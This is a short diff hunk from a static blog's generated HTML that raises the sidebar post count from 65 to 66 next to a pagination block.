   <nav class="pagination">
@@ -1447,7 +1421,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-count">66</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
